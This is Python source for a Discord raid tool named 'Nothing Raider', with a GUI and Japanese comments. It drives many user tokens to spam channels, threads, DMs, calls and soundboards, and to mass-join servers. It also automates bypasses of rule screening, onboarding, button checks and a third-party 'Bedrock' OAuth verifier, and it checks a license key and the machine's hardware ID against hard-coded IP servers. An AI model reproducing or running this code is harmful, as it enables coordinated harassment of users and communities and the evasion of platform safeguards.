def stop_custom_spammer():
    global stop_custom_spammer
    stop_custom_spammer = True  # この関数が呼ばれるとstop_spammerをTrueにしてスパムを停止

        
def get_user_id(token):
    headers = {'Authorization': token}
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        return response.json()['id']
    else:
        print(nowtime() + RED + f'Failed to get user ID for token {token}. Status code: {response.status_code}' + END)
        return None

def howbot(channel_id):
    if not channel_id:
        print(nowtime() + RED + 'Channel ID is invalid or empty.' + END)
        return

    os.system('title Nothing Raider - Custom Spammer Discord.gg/QRNutfWSpK')
    recent_messages = []
    user_ids = {token: get_user_id(token) for token in tokens}

    while True:
        for token in tokens:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            random_custom = random.choice(BOTmessages)
            data = {'content': f'{random_custom}'}

            try:
                response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
                
                if response.status_code == 200:
                    print(nowtime() + MAGENTA + f'送信成功: {token}' + END)
                    message_data = response.json()
                    recent_messages.append(message_data)
                    if len(recent_messages) > 10: 
                        recent_messages.pop(0)
                elif response.status_code == 429:
                    retry_after = response.json().get('retry_after', 1)
                    print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
                    time.sleep(retry_after)
                else:
                    print(nowtime() + RED + f'Failed to send message with token {token}. Status code: {response.status_code}' + END)

                if random.choice([True, False]) and recent_messages:  
                    reply_message = random.choice(recent_messages)
                    if reply_message['author']['id'] != user_ids[token]:  
                        random_custom2 = random.choice(BOTmessages)
                        reply_data = {'content': random_custom2, 'message_reference': {'message_id': reply_message['id']}}
                        reply_response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=reply_data)
                        
                        if reply_response.status_code == 200:
                            print(nowtime() + MAGENTA + f'リプライ送信成功: {token}' + END)
                        elif reply_response.status_code == 429:
                            retry_after = reply_response.json().get('retry_after', 1)
                            print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
                            time.sleep(retry_after)
                        else:
                            print(nowtime() + RED + f'リプライ送信失敗: {token}. Status code: {reply_response.status_code}' + END)

            except requests.exceptions.RequestException as e:
                print(nowtime() + RED + f'Error occurred while sending message with token {token}: {str(e)}' + END)
                
            time.sleep(random.uniform(1, 5)) 

def change_status(token):
    url = "wss://gateway.discord.gg/?v=9&encoding=json"
    
    def on_message(ws, message):
        message_data = json.loads(message)
        
        if message_data.get("op") == 10:
            heartbeat_interval = message_data["d"]["heartbeat_interval"] / 1000
            heartbeat_thread = threading.Thread(target=send_heartbeat, args=(ws, heartbeat_interval))
            heartbeat_thread.start()
            identify_payload = {
                "op": 2,
                "d": {
                    "token": token,
                    "intents": 513, 
                    "properties": {
                        "$os": "linux",
                        "$browser": "my_library",
                        "$device": "my_library"
                    },
                    "presence": {
                        "status": "online",
                        "activities": [
                            {
                                "name": "",
                                "type": 0
                            }
                        ]
                    }
                }
            }
            ws.send(json.dumps(identify_payload))
    
    def on_error(ws, error):
        print(f"WebSocket error occurred: {error}")
    
    def on_close(ws, close_status_code, close_msg):
        print(f"WebSocket connection closed: {close_status_code} - {close_msg}")
    
    def on_open(ws):
        print(f"WebSocket connection opened for token: {token}")
    
    def send_heartbeat(ws, interval):
        while True:
            time.sleep(interval)
            ws.send(json.dumps({"op": 1, "d": None}))
    
    ws = websocket.WebSocketApp(url,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close,
                                on_open=on_open)
    
    ws.run_forever()

def set_avatar(token, avatar_path):
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'multipart/form-data'
    }
    with open(avatar_path, 'rb') as f:
        data = {
            'avatar': f
        }
        url = f"{BASE_URL}/users/@me"
        response = requests.patch(url, headers=headers, files=data)
        if response.status_code == 200:
            print(f"Successfully set avatar for token: {token}")
        else:
            print(f"Failed to set avatar for token: {token}. Status code: {response.status_code}")
            
def nonce():
    date = datetime.now()
    unixts = time.mktime(date.timetuple())
    return (int(unixts)*1000-1420070400000)*4194304

def read_tokens(filename):
    with open(filename, 'r') as file:
        tokens2 = [line.strip() for line in file]
    return tokens2

def read_tokens_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            tokens = file.read().splitlines()
        return tokens
    except Exception as e:
        print(f"Failed to read tokens from file: {e}")
        return []

def change_global_name(token, new_name):
    url = "https://discord.com/api/v9/users/@me"
    cookies = get_discord_cookies()
    payload = {
        "global_name": new_name
    }
    try:
        response = session.patch(url, json=payload, headers=get_headers(token))
        if response.status_code == 200:
            print(f"Username changed successfully to: {new_name} for token: {token[:10]}...")
        elif response.status_code == 400:
            error_data = response.json()
            if "captcha_key" in error_data:
                print(f"Captcha required for token {token[:10]}. Update your app and solve captcha manually.")
            else:
                print(f"Failed to change username for token {token[:10]}: {response.status_code} - {response.text}")
        else:
            print(f"Failed to change username for token {token[:10]}: {response.status_code} - {response.text}")
    except requests.RequestException as e:
        print(f"An error occurred for token {token[:10]}: {e}")

def open_dm(token, user_id):
    url = "https://discord.com/api/v9/users/@me/channels"
    cookie = get_discord_cookies()
    payload = {
        "recipients": [user_id]
    }

    try:
        response = session.post(
            url,
            headers=headers(token, cookie),
            json=payload
        )

        if response.status_code == 200:
            channel_id = response.json().get("id")
            print(f"DM channel created successfully with ID: {channel_id}")
            return channel_id
        else:
            print(f"Failed to create DM channel")
            return None

    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def start_call(token, channel_id):
    url = f"wss://gateway.discord.gg/?v=9&encoding=json"
    cookie = get_discord_cookies()

    def on_open(ws):
        print("通話を開始しました。")

        # Identify payload to authenticate the connection
        identify_payload = {
            "op": 2,
            "d": {
                "token": token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1
                }
            }
        }
        ws.send(json.dumps(identify_payload))

        # Start call payload
        start_call_payload = {
            "op": 4,
            "d": {
                "guild_id": None,
                "channel_id": channel_id,
                "self_mute": False,
                "self_deaf": False
            }
        }
        ws.send(json.dumps(start_call_payload))

    def on_error(ws, error):
        print(f"WebSocket error: {error}")

    def on_close(ws):
        print("WebSocket connection closed")

    ws = websocket.WebSocketApp(
        url,
        on_open=on_open,
        on_error=on_error,
        on_close=on_close,
        header=headers(token, cookie)
    )

    ws.run_forever()
    
def spam_dm(token, channel_id, message):
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    cookies = get_discord_cookies()
    payload = {
        "content": message
    }

    try:
        response = session.post(
            url,
            headers=headers(token, cookies),
            json=payload
        )

        if response.status_code == 200:
            print(f"Message sent successfully to channel ID: {channel_id}")
        else:
            error_message = response.json().get("message", YELLOW + "[CAPTCHA]" + END)
            print(f"Failed to send message: {error_message}")

    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def open_dm_and_spam(user_id, message, dm_spam, call_spam, token):
    global stop_spamming

    while not stop_spamming:
        channel_id = open_dm(token, user_id)
        if channel_id:
            if dm_spam:
                spam_dm(token, channel_id, message)
            if call_spam:
                start_call(token, channel_id)
        else:
            print("DM チャネルの作成に失敗しました。")

def read_tokens(file_path):
    with open(file_path, "r") as file:
        return file.read().splitlines()

def vc_joiner(token, guild, channel):
    try:
        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
        ws.send(json.dumps({
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))
        ws.send(json.dumps({
            "op": 4,
            "d": {
                "guild_id": guild,
                "channel_id": channel,
                "self_mute": False,
                "self_deaf": False
            }
        }))
        print(f"Joined VC with token: {token[:25]}...")
    except Exception as e:
        print(f"Failed to join VC with token: {token[:25]}... Error: {e}")

def soundboard(token, channel_id):
    try:
        session = requests.Session()
        cookies = get_discord_cookies()
        sounds = session.get(
            "https://discord.com/api/v9/soundboard-default-sounds",
            headers=headers(token, cookies)
        ).json()

        while True:
            sound = random.choice(sounds)
            name = sound.get("name")
            payload = {
                "emoji_id": None,
                "emoji_name": sound.get("emoji_name"),
                "sound_id": sound.get("sound_id"),
            }

            response = session.post(
                f'https://discord.com/api/v9/channels/{channel_id}/send-soundboard-sound', 
                headers=headers(token, cookies), 
                json=payload,
            )

            if response.status_code == 204:
                print(f"サウンドの再生に成功！ {name}")
            elif response.status_code == 429:
                retry_after = response.json().get("retry_after")
                print(f"レートリミット - {retry_after}秒後に再試行。")
                time.sleep(float(retry_after))
            else:
                print(f"Failed to play sound: {response.json().get('message')}")
    except Exception as e:
        print(f"音声を再生できません。: {e}")

def fetch_form_fields(token, guild_id):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification"
    params = {"with_guild": "true"}
    try:
        response = requests.get(url, headers=get_headers(token), params=params)
        response.raise_for_status()
        return response.json().get('form_fields', [])
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred while fetching form fields: {err}")
        return []
    except Exception as err:
        print(f"An error occurred while fetching form fields: {err}")
        return []

def rule_bypass(token, guild_id):
    url_get = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification"
    params = {"with_guild": "true"}
    
    try:
        response_get = requests.get(url_get, headers=get_headers(token), params=params)
        response_get.raise_for_status()
        verification_info = response_get.json()
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred during GET request: {err}")
        return
    except Exception as err:
        print(f"An error occurred during GET request: {err}")
        return

    version = verification_info.get('version')
    if not version:
        print("バージョンの取得に失敗....")
        return

    form_fields = fetch_form_fields(token, guild_id)
    if not form_fields:
        print("フォームフィールドを取得できませんでした。.")
        return

    url_put = f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me"
    payload = {
        "version": version,
        "form_fields": form_fields
    }

    headers = get_headers(token)

    try:
        response_put = requests.put(url_put, headers=headers, json=payload)
        response_put.raise_for_status()
        print("認証を完了しました！")
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred during PUT request: {err}")
        print(f"Response content: {response_put.content.decode()}") 
    except Exception as err:
        print(f"An error occurred during PUT request: {err}")


def bypassBedrock(guild_id, token):
    state = generate_precise_state(guild_id)
    
    params = {
        'client_id': '1325891361899151440',
        'response_type': 'code',
        'redirect_uri': 'https://bedrock.aa-bot.com/',
        'scope': 'identify guilds.join',
        'state': state,
    }

    json_data = {
        'guild_id': guild_id,
        'permissions': '0',
        'authorize': True,
        'integration_type': 0,
        'location_context': {
            'guild_id': '10000',
            'channel_id': '10000',
            'channel_type': 10000,
        },
    }

    response = requests.post(
        'https://discord.com/api/v9/oauth2/authorize',
        params=params,
        headers=get_headers(token),
        json=json_data,
    )

    if response.status_code == 200:
        json_response = response.json()
        if "location" in json_response:
            url = json_response["location"]
            response_url = requests.get(url)

            if response_url.status_code == 200:
                print("認証突破成功!!")
            else:
                print(f"Error {response_url.status_code}: {response_url.text}")
        else:
            print("urlが存在しません。")
    else:
        print(f"Error {response.status_code}: {response.text}")

def get_user_id_from_token(token):
    url = "https://discord.com/api/v9/users/@me"
    
    try:
        response = requests.get(url, headers=get_headers(token))
        response.raise_for_status()
        user_data = response.json()
        return user_data['id']
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred while getting user ID: {err}")
        return None
    except Exception as err:
        print(f"An error occurred while getting user ID: {err}")
        return None

def get_random_image_file():
    png_files = [file for file in os.listdir(PICTURE_FOLDER) if file.lower().endswith('.png')]
    if not png_files:
        raise FileNotFoundError("悲しいことにPngファイルは出掛けてしまった！！")
    return os.path.join(PICTURE_FOLDER, random.choice(png_files))

def change_avatar(token): # Onlinerを使わないと動かないことを忘れないでね！！！Onlinerと統合してもいいけど
    url = "https://discord.com/api/v9/users/@me"

    image_path = get_random_image_file()

    with open(image_path, 'rb') as image_file:
        image_data = image_file.read()

    image_base64 = base64.b64encode(image_data).decode('utf-8')
    hide_token = token[:25].rstrip() + '#'
    payload = {
        "avatar": f"data:image/png;base64,{image_base64}" 
    }
    
    try:
        response = session.patch(url, headers=get_headers(token), json=payload)
        
        if response.status_code == 200:
            print(f"アバターの変更に成功 {hide_token}")
        else:
            print(f"アバターの変更に失敗 Onlinerを試してください。 {hide_token} Status code: {response.status_code}") # Captcha or Onlinerを使ってない

    except requests.exceptions.RequestException as err:
        print(f"不明なエラーによりアバターの変更に失敗 {hide_token}: {err}")

def start_avatar_change_threads():
    threads = []
    for token in tokens:
        thread = threading.Thread(target=change_avatar, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def button_bypass(token, message_id, channel_id, guild_id, button_option):
    try:
        payload = {
            'limit': '50',
            'around': message_id,
        }

        response = session.get(
            f'https://discord.com/api/v9/channels/{channel_id}/messages',
            params=payload,
            headers=get_headers(token)
        )
        hide_token = token[:25].rstrip() + '#'
        if response.status_code != 200:
            print(f"サーバーに入っていません | {hide_token}")
            return

        try:
            messages = response.json()
        except ValueError:
            print("レスポンスに無効なデータが含まれています。")
            return

        if isinstance(messages, list):
            messagebottoclick = next((x for x in messages if x["id"] == message_id), None)
        else:
            print("メッセージが届いた:", type(messages))
            return

        if messagebottoclick is None:
            print("Message not found")
            return

        buttons = []
        for component in messagebottoclick.get("components", []):
            for button in component.get("components", []):
                buttons.append(button)

        if not buttons:
            print("ボタンはありません。")
            return

        button_index = int(button_option) - 1

        if button_index < 0 or button_index >= len(buttons):
            print("無効なボタンです。")
            return

        data = {
            'application_id': messagebottoclick["author"]["id"],
            'channel_id': channel_id,
            'data': {
                'component_type': 2,
                'custom_id': buttons[button_index]["custom_id"],
            },
            'guild_id': guild_id,
            'message_flags': 0,
            'message_id': message_id,
            'nonce': nonce(),
            'session_id': uuid.uuid4().hex,
            'type': 3,
        }

        response = session.post(
            'https://discord.com/api/v9/interactions',
            headers=get_headers(token),
            json=data
        )

        if response.status_code == 204:
            print("成功", f"{token[:25]}##")
        else:
            print("失敗", f"{token[:25]}##")
    except Exception as e:
        print("失敗", "ボタンのクリックに失敗", e)

def thread_spam(token, channel_id, name):
    url = f'https://discord.com/api/v9/channels/{channel_id}/threads'
    
    while True:
        try:
            payload = {
                'name': f'{name}|{uuid.uuid4().hex}',
                'type': 11,
                'auto_archive_duration': random.choice([60, 1440, 4320, 10080]),
            }

            response = requests.post(url, headers=get_headers(token), json=payload)
            
            if response.status_code == 201:
                print("スレッド作成成功")
            else:
                print(f"スレッド作成失敗 | {response.status_code}, {response.text}")
        except Exception as e:
            print(f"エラーが発生しました: {e}")

def server_boost(guild_id, boost_count, token):
    # サーバーブーストを実行する関数
    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
    url2 = "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots"

    # ユーザーのブーストスロットを取得
    response_get = requests.get(url2, headers=get_headers(token))
    if response_get.status_code != 200:
        print(f"トークン {token} でブーストスロットの取得に失敗: ステータスコード {response_get.status_code}")
        return 0  # 失敗した場合はブースト数0を返す

    # 利用可能なスロット情報を取得
    slots = response_get.json()
    available_slots = [slot['id'] for slot in slots if not slot.get('premium_guild_subscription_id')]

    if not available_slots:
        print(f"トークン {token} で利用可能なスロットがありません。")
        return 0

    # 利用可能なスロット数と希望するブースト回数の最小値を計算
    boost_to_use = min(boost_count, len(available_slots))
    payload = {
        'user_premium_guild_subscription_slot_ids': available_slots[:boost_to_use]
    }

    # サーバーブーストを送信
    response = requests.put(url, headers=get_headers(token), json=payload)
    if response.status_code in (200, 201):
        print(f"トークン {token} で {boost_to_use} 回のブーストに成功しました。")
        return boost_to_use  # 成功したブースト数を返す
    else:
        print(f"トークン {token} でブーストに失敗しました: ステータスコード {response.status_code}")
        return 0  # 失敗した場合はブースト数0を返す

def boost_with_multiple_tokens(guild_id, boost_count):
    # tokens.txt からトークンを読み込む
    with open('tokens.txt', 'r') as file:
        tokens = [line.strip() for line in file.readlines()]

    remaining_boosts = boost_count
    for token in tokens:
        if remaining_boosts <= 0:
            print("すべてのブーストが完了しました。")
            break

        print(f"トークン {token} を使用してブーストを試みます。")
        # トークンを使用して限界までブーストを試みる
        boosts_done = server_boost(guild_id, remaining_boosts, token)

        # 残りのブースト回数を更新
        remaining_boosts -= boosts_done
        print(f"残りのブースト回数: {remaining_boosts}")

    if remaining_boosts > 0:
        print(f"指定されたブースト回数 {boost_count} を達成できませんでした。残り: {remaining_boosts}")
    else:
        print("すべての指定されたブーストが完了しました。")

def switch_to_main_ui():
    for widget in root.winfo_children():
        widget.destroy()
    setup_main_ui()

def setup_main_ui():
    tab_buttons_frame = ctk.CTkFrame(root, width=150)
    tab_buttons_frame.pack(side="left", fill="y")

    tab_buttons_canvas = ctk.CTkCanvas(tab_buttons_frame, width=150)
    tab_buttons_canvas.pack(side="left", fill="both", expand=True)

    scrollbar = ctk.CTkScrollbar(tab_buttons_frame, orientation="vertical", command=tab_buttons_canvas.yview)
    scrollbar.pack(side="right", fill="y")
    tab_buttons_canvas.configure(yscrollcommand=scrollbar.set)

    tab_buttons_inner_frame = ctk.CTkFrame(tab_buttons_canvas, width=150)
    tab_buttons_canvas.create_window((0, 0), window=tab_buttons_inner_frame, anchor="nw")

    tab_buttons_inner_frame.bind("<Configure>", lambda e: tab_buttons_canvas.configure(scrollregion=tab_buttons_canvas.bbox("all")))

    def _on_mouse_wheel(event):
        tab_buttons_canvas.yview_scroll(int(-1*(event.delta/120)), "units")

    tab_buttons_canvas.bind_all("<MouseWheel>", _on_mouse_wheel)

    create_tab_button(tab_buttons_inner_frame, "KeyChanger", lambda: switch_tab(change_key_ui))
    create_tab_button(tab_buttons_inner_frame, "Joiner", lambda: switch_tab(joiner_tab))
    create_tab_button(tab_buttons_inner_frame, "Leaver", lambda: switch_tab(leaver_tab))
    create_tab_button(tab_buttons_inner_frame, "Booster", lambda: switch_tab(boost_tab))
    create_tab_button(tab_buttons_inner_frame, "OLD Spammer", lambda: switch_tab(spammerOLD_tab))
    create_tab_button(tab_buttons_inner_frame, "Token Checker", lambda: switch_tab(check_tokens_tab))
    create_tab_button(tab_buttons_inner_frame, "Reaction", lambda: switch_tab(reaction_tab))
    create_tab_button(tab_buttons_inner_frame, "Fake Typer", lambda: switch_tab(fake_typer_tab))
    create_tab_button(tab_buttons_inner_frame, "All Channel Spam", lambda: switch_tab(all_channel_spam_tab))
    create_tab_button(tab_buttons_inner_frame, "Format Changer", lambda: switch_tab(format_changer_tab))
    create_tab_button(tab_buttons_inner_frame, "Bot", lambda: switch_tab(bot_tab))
    create_tab_button(tab_buttons_inner_frame, "Onliner", lambda: switch_tab(onliner_tab))
    create_tab_button(tab_buttons_inner_frame, "New Spammer", lambda: switch_tab(new_spammer_tab))
    create_tab_button(tab_buttons_inner_frame, "Command spammer", lambda: switch_tab(command_spammer_tab))
    create_tab_button(tab_buttons_inner_frame, "Nick Changer", lambda: switch_tab(change_global_name_ui))
    create_tab_button(tab_buttons_inner_frame, "Avatar Changer", lambda: switch_tab(avatar_changer_ui))
    create_tab_button(tab_buttons_inner_frame, "MassDM", lambda: switch_tab(open_dm_spam_tab))
    create_tab_button(tab_buttons_inner_frame, "VC Joiner and Spammer", lambda: switch_tab(vc_joiner_ui))
    create_tab_button(tab_buttons_inner_frame, "Onboarding Bypass", lambda: switch_tab(onboarding_bypass_tab))
    create_tab_button(tab_buttons_inner_frame, "Bio Changer", lambda: switch_tab(bio_changer_ui))
    create_tab_button(tab_buttons_inner_frame, "Bedrock bypasser", lambda: switch_tab(bedrockbypassui))
    create_tab_button(tab_buttons_inner_frame, "Rule Bypass", lambda: switch_tab(rule_bypass_ui))
    create_tab_button(tab_buttons_inner_frame, "Button pusher", lambda: switch_tab(button_pusher_ui))
    create_tab_button(tab_buttons_inner_frame, "Thread Spammer", lambda: switch_tab(thread_spam_ui))
    create_tab_button(tab_buttons_inner_frame, "Info", lambda: switch_tab(info))

    global content_frame
    content_frame = ctk.CTkFrame(root)
    content_frame.pack(side="right", fill="both", expand=True)

    switch_tab(info)

def create_tab_button(parent, text, command):
    button = ctk.CTkButton(parent, text=text, command=command, width=150)
    button.pack(pady=5, padx=5)

def switch_tab(tab_function):
    for widget in content_frame.winfo_children():
        widget.destroy()

    tab_function(content_frame)

def boost_tab(frame):
    # UI要素の削除
    for widget in frame.winfo_children():
        widget.destroy()

    # ギルドID入力フィールド
    guild_label = ctk.CTkLabel(frame, text="Guild ID")
    guild_label.pack(pady=5)
    guild_entry = ctk.CTkEntry(frame)
    guild_entry.pack(pady=5)

    # ブースト回数入力フィールド
    boost_label = ctk.CTkLabel(frame, text="Boost Count")
    boost_label.pack(pady=5)
    boost_entry = ctk.CTkEntry(frame)
    boost_entry.pack(pady=5)

    # ブースト実行ボタン
    boost_button = ctk.CTkButton(frame, text="ブースト開始", command=lambda: threading.Thread(target=start_boosting, args=(guild_entry.get(), boost_entry.get())).start())
    boost_button.pack(pady=20)

def start_boosting(guild_id, boost_count):
    try:
        # 入力値を整数に変換
        guild_id = int(guild_id)
        boost_count = int(boost_count)
        
        if guild_id <= 0 or boost_count <= 0:
            print("無効なギルドIDまたはブースト回数です。")
            return
        
        # ブースト処理を開始
        print(f"ギルドID: {guild_id}, ブースト回数: {boost_count} を処理中...")
        boost_with_multiple_tokens(guild_id, boost_count)
    
    except ValueError:
        print("ギルドIDとブースト回数は数字で入力してください。")

def read_key_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            key = file.read().strip()
        return key
    except IOError as e:
        tkinter.messagebox.showerror("File Error", str(e))
        return None

def write_key_to_file(file_path, key):
    try:
        with open(file_path, 'w') as file:
            file.write(key)
        print("キーを自動保存しました。")
    except IOError as e:
        tkinter.messagebox.showerror("File Error", str(e))
        print(f"ファイルへの書き込みエラー: {str(e)}")

def setup_login_ui():
    login_frame = ctk.CTkFrame(root)
    login_frame.pack(fill="both", expand=True)
    
    api_key_label = ctk.CTkLabel(login_frame, text="Key")
    api_key_label.pack(pady=10)
    
    api_key_entry = ctk.CTkEntry(login_frame, show="*")
    api_key_entry.pack(pady=10)
    
    login_button = ctk.CTkButton(login_frame, text="Login", command=lambda: handle_key_validation(api_key_entry.get()))
    login_button.pack(pady=20)

    api_key = read_key_from_file('key.txt')
    if api_key:
        print("保存されたキーから認証しています...")
        handle_key_validation(api_key)

# SMBIOS情報の取得
def get_hwid():
    c = wmi.WMI()
    for system in c.Win32_ComputerSystemProduct():
        return system.UUID

def handle_key_validation(api_key):
    try:
        os.system('title Nothing RaiderV2')
        print("サーバーに接続しています。3秒ほど待つ場合がございますが、閉じずにお待ち下さい....")
        hwid = get_hwid()
        response = requests.post('http://209.25.142.16:2374/validate_key', json={"api_key": api_key, "hwid": hwid})
        if response.status_code == 200:
            os.system('cls')
            print("認証完了!")
            write_key_to_file('key.txt', api_key)
            switch_to_main_ui()
        else:
            tkinter.messagebox.showerror("認証に失敗", "無効なキー")
            print(f"認証失敗: {response.status_code}")
    except requests.RequestException as e:
        tkinter.messagebox.showerror("サーバーに接続できません。", str(e))
        print(f"リクエストエラー: {str(e)}") 

def switch_to_main_ui():
    for widget in root.winfo_children():
        widget.destroy()
    setup_main_ui()

def change_key_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    key_label = ctk.CTkLabel(frame, text="現在のキー:")
    key_label.pack(pady=5)

    old_key_entry = ctk.CTkEntry(frame, width=250)
    old_key_entry.pack(pady=5)

    def change_key():
        old_key = old_key_entry.get()
        try:
            response = requests.post('http://46.250.233.220:25592/change_key', json={"old_key": old_key})
            if response.status_code == 200:
                new_key = response.json().get('new_key')
                tkinter.messagebox.showinfo("キー更新", f"新しいキー: {new_key}")
                print(f"新しいキー: {new_key}")
            else:
                tkinter.messagebox.showerror("更新失敗", "無効なキー")
                print(f"更新失敗: {response.status_code}")
        except requests.RequestException as e:
            tkinter.messagebox.showerror("サーバーに接続できません。", str(e))
            print(f"リクエストエラー: {str(e)}")

    change_key_button = ctk.CTkButton(frame, text="キー変更", command=change_key)
    change_key_button.pack(pady=20)

def joiner_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    invite_label = ctk.CTkLabel(frame, text="招待リンク")
    invite_label.pack(pady=5)

    invite_entry = ctk.CTkEntry(frame, width=250)
    invite_entry.pack(pady=5)

    use_captcha_var = ctk.BooleanVar()
    use_captcha_checkbox = ctk.CTkCheckBox(frame, text="CapSolverを使用(Capsolverは現在Discordでは使用できません。)", variable=use_captcha_var)
    use_captcha_checkbox.pack(pady=5)

    def start_joining():
        invite = invite_entry.get()
        tokens = read_tokens('tokens.txt')
        invite_code = extract_invite_code(invite)
        use_captcha = use_captcha_var.get()

        if invite_code:
            def process_tokens():
                try:
                    threads = []
                    for token in tokens:
                        thread = threading.Thread(target=joiner, args=(token, invite_code, use_captcha))
                        threads.append(thread)
                        thread.start()
                        time.sleep(0.05)
                    for thread in threads:
                        thread.join()

                except Exception as e:
                    print(f"Error processing tokens: {e}")

            thread = threading.Thread(target=process_tokens)
            thread.start()
        else:
            tkinter.messagebox.showwarning("Error", "正しくないURL")

    join_button = ctk.CTkButton(frame, text="参加", command=start_joining)
    join_button.pack(pady=20)

def read_tokens(file_path):
    with open(file_path, "r") as f:
        tokens = f.read().splitlines()

    return tokens

def onboard_bypass(guild_id, tokens):
    onboarding_responses_seen = {}
    onboarding_prompts_seen = {}
    onboarding_responses = []
    in_guild = []
    cookie = get_discord_cookies()

    try:
        for token in tokens:
            response = session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
                headers=headers(token, cookie)
            )
            if response.status_code == 200:
                in_guild.append(token)
                break

        if not in_guild:
            hide_token = token[:25].rstrip() + '#'
            print(f"失敗[このtokenはサーバーに入っていません。| {hide_token}")
            return

        data = response.json()
        now = int(datetime.now().timestamp())

        for prompt in data.get("prompts", []):
            onboarding_responses.append(prompt["options"][-1]["id"])
            onboarding_prompts_seen[prompt["id"]] = now

            for option in prompt["options"]:
                if option:
                    onboarding_responses_seen[option["id"]] = now

        def run_task(token):
            try:
                json_data = {
                    "onboarding_responses": onboarding_responses,
                    "onboarding_prompts_seen": onboarding_prompts_seen,
                    "onboarding_responses_seen": onboarding_responses_seen,
                }

                response = session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=headers(token, cookie),
                    json=json_data
                )
                hide_token = token[:25].rstrip() + '*'
                if response.status_code == 200:
                    print(f"成功: {hide_token}")
                else:
                    print(f"失敗: {hide_token} - {response.json().get('message')}")
            except Exception as e:
                print(f"失敗: {hide_token} - {e}")

        threads = []
        for token in tokens:
            thread = threading.Thread(target=run_task, args=(token,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    except Exception as e:
        print(f"オンボード回避に失敗。{e}")

def start_onboarding_bypass(guild_id):
    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()
    onboard_bypass(guild_id, tokens)

def bio_changer(token, bio):
    cookie = get_discord_cookies()
    payload = {
        "bio": bio
    }
    while True:
        try:
            response = session.patch(
                "https://discord.com/api/v9/users/@me/profile",
                headers=headers(token, cookie),
                json=payload
            )

            if response.status_code == 200:
                print(f"Changed bio to: {bio}")
                return f"Bio changed for token: {token}"
            elif response.status_code == 429:
                retry_after = response.json().get("retry_after", 0)
                print(f"Rate limit exceeded - retrying in {retry_after}s")
                time.sleep(float(retry_after))
            else:
                error_message = response.json().get('message', 'Unknown error')
                print(f"Failed to change bio: {response.status_code} - {error_message}")
                return f"Failed to change bio for token {token}: {response.status_code} - {error_message}"
        except Exception as e:
            print(f"An error occurred: {e}")
            return f"An error occurred for token {token}: {e}"

def leaver_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    server_label = ctk.CTkLabel(frame, text="Guild IDを貼ってください。")
    server_label.pack(pady=5)
    server_entry = ctk.CTkEntry(frame)
    server_entry.pack(pady=5)
    leave_button = ctk.CTkButton(frame, text="退出", command=lambda: threading.Thread(target=leaver, args=(server_entry.get(),)).start())
    leave_button.pack(pady=20)

def stop_spammerOLD():
    global spammingOLD
    spammingOLD = False

def spammerOLD_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelIDを貼ってください。")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    message_label = ctk.CTkLabel(frame, text="スパムするメッセージ")
    message_label.pack(pady=5)
    message_entry = ctk.CTkTextbox(frame, width=500, height=250)
    message_entry.pack(pady=5)
    spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=spammerOLD, args=(channel_entry.get(), message_entry.get("1.0", "end-1c"))).start())
    spam_button.pack(pady=5)
    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammerOLD)
    stop_button.pack(pady=5)

def check_tokens_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    check_button = ctk.CTkButton(frame, text="Tokenチェック", command=start_checking_tokens)
    check_button.pack(pady=20)

def start_checking_tokens():
    global tokens
    tokens = read_tokens('tokens.txt')
    thread = threading.Thread(target=check_and_remove_invalid_tokens)
    thread.start()

def reaction_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    message_label = ctk.CTkLabel(frame, text="メッセージID")
    message_label.pack(pady=5)
    message_entry = ctk.CTkEntry(frame)
    message_entry.pack(pady=5)
    emoji_label = ctk.CTkLabel(frame, text="リアクションする絵文字")
    emoji_label.pack(pady=5)
    emoji_entry = ctk.CTkEntry(frame)
    emoji_entry.pack(pady=5)
